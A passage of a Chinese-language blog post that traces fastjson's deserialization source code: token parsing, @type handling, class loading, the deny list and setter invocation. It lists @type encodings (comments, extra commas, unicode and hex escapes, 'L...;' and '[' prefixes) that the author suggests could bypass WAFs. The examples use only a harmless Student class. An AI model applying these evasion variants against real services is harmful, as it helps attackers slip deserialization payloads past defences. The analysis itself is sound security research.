class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title function_">parseObject</span><span class="params">(String text)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> parse(text);</span><br><span class="line">    <span class="keyword">return</span> obj <span class="keyword">instanceof</span> JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们注意到，只有最后一次反序列化的时候调用了setXxx方法，因为最后一次传递了一个Student.class给他，fastjson才能知道这段String最后到底应该反序列化为哪个对象<br>而且反序列化的时候调用的构造函数是无参构造器，所以fastjson反序列化的JavaBean必须有无参构造器，否则就会报错</p>
<blockquote>
<p><strong>@type</strong><br>如果每次都需要传递具体是哪个类的，就会显得这个反序列化很笨重，所以开发者给定了一个@type的键，可以在json字符串里面指定具体要反序列化为哪个对象<br><code>serJson = &quot;&#123;\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:12,\&quot;name\&quot;:\&quot;Sam\&quot;&#125;&quot;;</code><br>如果是将这样的json字符串进行反序列化，那么上面的三种反序列化方式也都可以正确反序列化<br>所以这个点也是后续漏洞的核心关键</p>
</blockquote>
<h2 id="反序列化源码分析"><a href="#反序列化源码分析" class="headerlink" title="反序列化源码分析"></a>反序列化源码分析</h2><p><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/3.jpg" alt></p>
<h3 id="No1-DefaultJSONParser"><a href="#No1-DefaultJSONParser" class="headerlink" title="No1 DefaultJSONParser"></a>No1 DefaultJSONParser</h3><p>首先会进入这里，new了一个DefaultJSONParser对象<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/4.jpg" alt><br>跟进去会首先判断第一个字符是什么，如果是“{”，就会将token设置为12，如果是“[”，就会设置14，如果都不是就会进入nextToken，主要作用就是看下一个字符是什么，如果碰到了“{”就将token设置为12<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//部分代码</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">    <span class="built_in">this</span>.next();</span><br><span class="line">    <span class="built_in">this</span>.token = <span class="number">14</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><br>当然还有其它情况，比如碰到空格之类的，就会继续跳到下一个字符，直到碰到像“{”这样的字符，有时绕waf可能就会用到这些特性，比如在json前面填充垃圾字符<br><code>serJson = &quot;        &#123;\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:12,\&quot;name\&quot;:\&quot;Sam\&quot;&#125;&quot;;</code><br>剩下的读者可以自行分析</p>
<blockquote>
<p><strong>小插曲</strong><br>这里我将{}改成了[]，然后进行了反序列化<br><code>serJson = &quot;[\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:12,\&quot;name\&quot;:\&quot;Sam\&quot;]&quot;;</code><br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/5.jpg" alt><br>但是报错了，继续fuzz，试了一下{开头，]结尾<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/6.jpg" alt><br>虽然最后报错了，但是前面确实可以反序列化，说不定这种就可以绕一下waf</p>
</blockquote>
<p><em>注意上面的操作都是在json字符串之前的，也就是在“{”前面的一些检查，接下来就进入{}里面了</em></p>
<h3 id="No2-parseObject-gt-skipWhitespace"><a href="#No2-parseObject-gt-skipWhitespace" class="headerlink" title="No2 parseObject()-&gt;skipWhitespace()"></a>No2 parseObject()-&gt;skipWhitespace()</h3><p>走完DefaultJSONParser的初始化，就进入到parser.parse()<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/7.jpg" alt><br>因为之前是{，所以设置的token为12，所以就会进入这个case<br>由于字节的原因，我不能在这下断点，所以我直接将断点打到parseObject里面<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/8.jpg" alt><br>直接跳到这个循环处<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/9.jpg" alt><br>第一个函数根据英文意思skipWhitespace，可以大概猜出是跳过空白字符串<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">skipWhitespace</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.ch &lt;= <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27; &#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\r&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\n&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\t&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\f&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\b&#x27;</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.next();</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.skipComment();</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到具体实现，不仅可以跳过空格，换行之类的，还可以跳过注释（skipComment）<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">skipComment</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.next();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.ch != <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.next();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(<span class="built_in">this</span>.ch != <span class="number">26</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.next();</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.next();</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">this</span>.next();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;invalid comment&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.next();</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="built_in">this</span>.ch != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>那么就是/*xxxx*/<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123; <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123;<span class="comment">/**/&quot;<span class="doctag">@type</span>&quot;:&quot;Student&quot;&#125;</span></span><br><span class="line"><span class="comment">&#123;/*abcdef*/</span><span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br></pre></td></tr></table></figure><br>那么这四种其实效果相同，都可以达到反序列化的目的</p>
<h3 id="No3-parseObject-gt-AllowArbitraryCommas"><a href="#No3-parseObject-gt-AllowArbitraryCommas" class="headerlink" title="No3 parseObject()-&gt;AllowArbitraryCommas"></a>No3 parseObject()-&gt;AllowArbitraryCommas</h3><p>在走完上面的判断以后，接下来就是<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/10.jpg" alt><br>同样，根据字面意思和代码，大概推断就是判断有没有逗号，如果有就跳过<br>也就是<code>&#123;,,,,&quot;@type&quot;:&quot;Student&quot;&#125;</code>，也是可以进行正常反序列化的</p>
<h3 id="No4-parseObject-gt-scanSymbol"><a href="#No4-parseObject-gt-scanSymbol" class="headerlink" title="No4 parseObject()-&gt;scanSymbol()"></a>No4 parseObject()-&gt;scanSymbol()</h3><p>继续往下走<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/11.jpg" alt><br>因为走完前面的一系列操作，那么当前的字符就是@type之前的双引号了<br>这里的scanSymbol很重要，主要就是扫描到下一个双引号出现之前的字符串，在这就是@type<br>其中有几段比较重要的特性，我这截取了部分代码<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (chLocal == <span class="string">&#x27;\\&#x27;</span>) &#123;</span><br><span class="line">    chLocal = <span class="built_in">this</span>.next();</span><br><span class="line">    <span class="keyword">switch</span>(chLocal) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:</span><br><span class="line">            <span class="type">char</span> <span class="variable">c1</span> <span class="operator">=</span> <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">char</span> <span class="variable">c2</span> <span class="operator">=</span> <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">char</span> <span class="variable">c3</span> <span class="operator">=</span> <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">char</span> <span class="variable">c4</span> <span class="operator">=</span> <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> Integer.parseInt(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">char</span>[]&#123;c1, c2, c3, c4&#125;), <span class="number">16</span>);</span><br><span class="line">            hash = <span class="number">31</span> * hash + val;</span><br><span class="line">            <span class="built_in">this</span>.putChar((<span class="type">char</span>)val);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">            <span class="type">char</span> <span class="variable">x1</span> <span class="operator">=</span> <span class="built_in">this</span>.ch = <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">char</span> <span class="variable">x2</span> <span class="operator">=</span> <span class="built_in">this</span>.ch = <span class="built_in">this</span>.next();</span><br><span class="line">            <span class="type">int</span> <span class="variable">x_val</span> <span class="operator">=</span> digits[x1] * <span class="number">16</span> + digits[x2];</span><br><span class="line">            <span class="type">char</span> <span class="variable">x_char</span> <span class="operator">=</span> (<span class="type">char</span>)x_val;</span><br><span class="line">            hash = <span class="number">31</span> * hash + x_char;</span><br><span class="line">            <span class="built_in">this</span>.putChar(x_char);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>什么意思呢，就是当遇见斜杠，那么就看斜杠后面第一个字母是什么<br>如果是u那就读取u后面4位，当作unicode解码<br>同理如果是x就当作十六进制解码<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;\u0040\u0074\u0079pe&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;\x40\x74\x79\x70\x65&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;\x40\x74\x79pe&quot;</span>:<span class="string">&quot;Student&quot;</span>&#125;</span><br></pre></td></tr></table></figure><br>这上面5个json是等价的，都可以正常进行反序列化</p>
<h3 id="No5-parseObject-gt-TypeUtils-loadClass"><a href="#No5-parseObject-gt-TypeUtils-loadClass" class="headerlink" title="No5 parseObject()-&gt;TypeUtils.loadClass()"></a>No5 parseObject()-&gt;TypeUtils.loadClass()</h3><p>提取完了@type这个键的字符串以后，就要解析键值了，在这里就是Student<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/12.jpg" alt><br>可以看到同样用到了scanSymbol，也就是说我们的类名也可以用十六进制和unicode去编码<br><code>&#123;&quot;\x40\x74\x79pe&quot;:&quot;\u0053\u0074\u0075dent&quot;&#125;</code><br>接着就进入到了loadClass了，动态加载类<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/13.jpg" alt><br>首先会在mappings中去找是否存在这些类，如果不存在就跳到<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (classLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = classLoader.loadClass(className);</span><br><span class="line">    mappings.put(className, clazz);</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>去动态加载类，并且将类和类名添加到mappings中，然后返回此类，这里的mappings其实是一个缓存，一般是java的原生类，关于动态加载类到底知识可以自己百度搜索一下，这里不细说</p>
<blockquote>
<p>小插曲<br>这里我注意到了中间两个if语句<br>第一个：如果第一个字符是“[”，那么就将他去掉，在进行loadClass<br>第二个：如果第一个字符是“L”,且结尾是“;”，那么也是去掉以后调用loadClass<br>这里我fuzz了一下<br><code>&#123;&quot;@type&quot;:&quot;[Student&quot;&#125;</code><br>中括号加在最前面会报错，不知道为什么，但是根据他的报错信息，我最后整理了一个新的可以利用的，在下一篇我会说一下我是如何找出这样的payload的<code>&#123;&quot;@type&quot;:&quot;[Student&quot;[&#123;,&quot;age&quot;:12,&quot;name&quot;:&quot;kaikaix&quot;&#125;</code><br><code>&#123;&quot;@type&quot;:&quot;LStudent;&quot;&#125;</code><br><code>&#123;&quot;@type&quot;:&quot;LLStudent;;&quot;&#125;</code><br>这样就不会报错，可以继续接下来的操作，调用无参构造和set方法</p>
</blockquote>
<h3 id="No6-parseObject-gt-getDeserializer"><a href="#No6-parseObject-gt-getDeserializer" class="headerlink" title="No6 parseObject()-&gt;getDeserializer()"></a>No6 parseObject()-&gt;getDeserializer()</h3><p>接下来到了<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/14.jpg" alt><br>我们进入到getDeserializer中，中间会到了一个denyList的一个循环<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/15.jpg" alt><br>这里前面的replace是将“$”替换为“.”</p>
<blockquote>
<p>如果A类中有个内部类B<br>在编译的时候会生成A.class和A$B.class</p>
</blockquote>
<p>那么这一段代码就是用来检查你的类名是否在黑名单中，但是在这个版本的fastjson，黑名单只有两个Thread类</p>
<h3 id="No7-parseObject-gt-getDeserializer-gt-createJavaBeanDeserializer"><a href="#No7-parseObject-gt-getDeserializer-gt-createJavaBeanDeserializer" class="headerlink" title="No7 parseObject()-&gt;getDeserializer()-&gt;createJavaBeanDeserializer()"></a>No7 parseObject()-&gt;getDeserializer()-&gt;createJavaBeanDeserializer()</h3><p>过了黑名单以后，就会与一些fastjson支持的类进行匹配，如果匹配到了就会返回相应的Deserializer<br>如果匹配不到就到下图代码中的地方<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/16.jpg" alt><br>进入到这个函数中会先获取一下clazz的父类，然后就到了这里<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/17.jpg" alt><br>主要就是通过获取构造函数和一些成员方法构建了一个JavaBeanInfo类，并返回<br>这里需要提的是，他在内部会判断一个成员方法是否是setXxx方法或getXxx方法，如果符合一些条件就会添加入fieldList这个数组中<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//set的</span></span><br><span class="line"><span class="keyword">if</span> (methodName.length() &gt;= <span class="number">4</span> &amp;&amp; </span><br><span class="line">!Modifier.isStatic(method.getModifiers()) &amp;&amp; </span><br><span class="line">(method.getReturnType().equals(Void.TYPE) || </span><br><span class="line">method.getReturnType().equals(method.getDeclaringClass())))&#123;</span><br><span class="line">    <span class="keyword">if</span> (methodName.startsWith(<span class="string">&quot;set&quot;</span>)) &#123;</span><br><span class="line">        add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(</span><br><span class="line">                propertyName, </span><br><span class="line">                method, </span><br><span class="line">                field, </span><br><span class="line">                clazz, </span><br><span class="line">                type, </span><br><span class="line">                ordinal, </span><br><span class="line">                serialzeFeatures, </span><br><span class="line">                parserFeatures, </span><br><span class="line">                annotation, </span><br><span class="line">                fieldAnnotation, </span><br><span class="line">                (String)<span class="literal">null</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get的</span></span><br><span class="line"><span class="keyword">if</span> (methodName.length() &gt;= <span class="number">4</span> &amp;&amp; </span><br><span class="line">!Modifier.isStatic(method.getModifiers()) &amp;&amp; </span><br><span class="line">methodName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; </span><br><span class="line">Character.isUpperCase(methodName.charAt(<span class="number">3</span>)) &amp;&amp; </span><br><span class="line">method.getParameterTypes().length == <span class="number">0</span> &amp;&amp; </span><br><span class="line">(Collection.class.isAssignableFrom(method.getReturnType()) ||</span><br><span class="line">Map.class.isAssignableFrom(method.getReturnType()) || </span><br><span class="line">AtomicBoolean.class == method.getReturnType() || </span><br><span class="line">AtomicInteger.class == method.getReturnType() || </span><br><span class="line">AtomicLong.class == method.getReturnType()))&#123;</span><br><span class="line">    add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(</span><br><span class="line">            propertyName, </span><br><span class="line">            method, </span><br><span class="line">            (Field)<span class="literal">null</span>, </span><br><span class="line">            clazz, </span><br><span class="line">            type, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line">            annotation, </span><br><span class="line">            (JSONField)<span class="literal">null</span>, </span><br><span class="line">            (String)<span class="literal">null</span>)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>从上面的代码可以看出，如果要把set方法添加进入fieldList，那么此方法需要满足的几个点</p>
<ul>
<li>返回值为void类型或者返回值的类型是当前类</li>
<li>不能是静态方法</li>
<li>开头是set<br>我这里用下面两块代码来解释一下第一点<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Student <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>get的满足条件</p>
<ul>
<li>Method不是静态的</li>
<li>Method无参数</li>
<li>Method的返回类型要继承自上面所写的类</li>
</ul>
<p>接下来解释一下FieldInfo的几个重要参数</p>
<ul>
<li>propertyName，简而言之就是getXxx或setXxx的Xxx，也就是相应方法的变量名称，是一个字符串类型</li>
<li>method，就是一个Method类，是getXxx或setXxx的反射</li>
</ul>
<p>这个fieldList在后面调用方法的时候有重要作用<br>当把所有相应的方法加到fieldList中后，就到了这个函数的最后一步<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/18.jpg" alt><br><code>return new JavaBeanInfo(clazz, builderClass, defaultConstructor, null, null, buildMethod, jsonType, fieldList);</code><br>会把fieldList和该class类的反射封装到JavaBeanInfo里面<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/19.jpg" alt><br>这里需要注意一下这段代码，他会把传入的fieldList进行一个排序，然后赋值给sortedFields<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/20.jpg" alt><br>接下来走到这，重新new了一个JavaBeanDeserializer对象，不过和上面的步骤相同，然后返回</p>
<h3 id="No8-parseObject-gt-deserializer-deserialze"><a href="#No8-parseObject-gt-deserializer-deserialze" class="headerlink" title="No8 parseObject()-&gt;deserializer.deserialze()"></a>No8 parseObject()-&gt;deserializer.deserialze()</h3><p>返回以后最后赋值给了deserializer，也就是No6<br>我们看到deserializer有一个sortedFieldDesrializers，也就是No7中的sortedFields<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/21.jpg" alt><br>接下来直接看到parseField<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/22.jpg" alt><br>这个函数主要就是用来调用getXxx或者setXxx，对Xxx进行一些赋值操作<br>进入此函数，可以看到开头有一个smartMatch<br>节选一段重要代码<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> FieldDeserializer <span class="title function_">smartMatch</span><span class="params">(String key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (snakeOrkebab) &#123;</span><br><span class="line">        fieldDeserializer = getFieldDeserializer(key2);</span><br><span class="line">        <span class="keyword">if</span> (fieldDeserializer == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (FieldDeserializer fieldDeser : sortedFieldDeserializers) &#123;</span><br><span class="line">                <span class="keyword">if</span> (fieldDeser.fieldInfo.name.equalsIgnoreCase(key2)) &#123;</span><br><span class="line">                    fieldDeserializer = fieldDeser;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>key2就是getXxx或者setXxx对应的Xxx<br>上面的代码就是从sortedFieldDeserializers数组中（No7中的fieldList）寻找是否有可以匹配得到的，匹配得到就返回FieldDeserializer，匹配不到就返回null<br>如果是null就会执行的下面的代码<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">deserOrField</span> <span class="operator">=</span> extraFieldDeserializers.get(key);</span><br><span class="line"><span class="keyword">if</span> (deserOrField != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (deserOrField <span class="keyword">instanceof</span> FieldDeserializer) &#123;</span><br><span class="line">        fieldDeserializer = ((FieldDeserializer) deserOrField);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> (Field) deserOrField;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">FieldInfo</span> <span class="variable">fieldInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(key, field.getDeclaringClass(), field.getType(), field.getGenericType(), field, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        fieldDeserializer = <span class="keyword">new</span> <span class="title class_">DefaultFieldDeserializer</span>(parser.getConfig(), clazz, fieldInfo);</span><br><span class="line">        extraFieldDeserializers.put(key, fieldDeserializer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>从extraFieldDeserializers中get相应的field<br>extraFieldDeserializers是一个HashMap，键是所有的成员变量，值是成员变量对应的field，最后fieldDeserializer就是对相应field进行一次封装<br>最后用这个封装好的类进行parseField<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/24.jpg" alt></p>
<h3 id="No9-parseObject-gt-deserializer-deserialze-gt-parseField-gt-fieldDeserializer-parseField"><a href="#No9-parseObject-gt-deserializer-deserialze-gt-parseField-gt-fieldDeserializer-parseField" class="headerlink" title="No9 parseObject()-&gt;deserializer.deserialze()-&gt;parseField()-&gt;fieldDeserializer.parseField()"></a>No9 parseObject()-&gt;deserializer.deserialze()-&gt;parseField()-&gt;fieldDeserializer.parseField()</h3><p>首先对value进行解析，这里可以看到，如果是byte类型，那么就会对其进行一个base64解码<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/23.jpg" alt><br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/25.jpg" alt><br>所以如果要给byte类型进行反序列化，那么就需要先进行一次base64加密<br>赋值完以后就进入了setValue操作，给反序列化的对象设置值<br><img src="/2022/12/01/fastjson%E5%88%9D%E5%AD%A6/26.jpg" alt><br>setValue的实现<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object object, Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span> <span class="comment">//</span></span><br><span class="line">        &amp;&amp; fieldInfo.fieldClass.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> fieldInfo.method;</span><br><span class="line">        <span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (fieldInfo.getOnly) &#123;</span><br><span class="line">                <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicInteger.class) &#123;</span><br><span class="line">                    <span class="type">AtomicInteger</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicInteger) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicInteger) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicLong.class) &#123;</span><br><span class="line">                    <span class="type">AtomicLong</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicLong) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicLong) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicBoolean.class) &#123;</span><br><span class="line">                    <span class="type">AtomicBoolean</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicBoolean) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicBoolean) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(method.getReturnType())) &#123;</span><br><span class="line">                    <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (map != <span class="literal">null</span>) &#123;</span><br><span class="line">                        map.putAll((Map) value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">Collection</span> <span class="variable">collection</span> <span class="operator">=</span> (Collection) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (collection != <span class="literal">null</span>) &#123;</span><br><span class="line">                        collection.addAll((Collection) value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                method.invoke(object, value);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> fieldInfo.field;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (fieldInfo.getOnly) &#123;</span><br><span class="line">                <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicInteger.class) &#123;</span><br><span class="line">                    <span class="type">AtomicInteger</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicInteger) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicInteger) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicLong.class) &#123;</span><br><span class="line">                    <span class="type">AtomicLong</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicLong) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicLong) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> 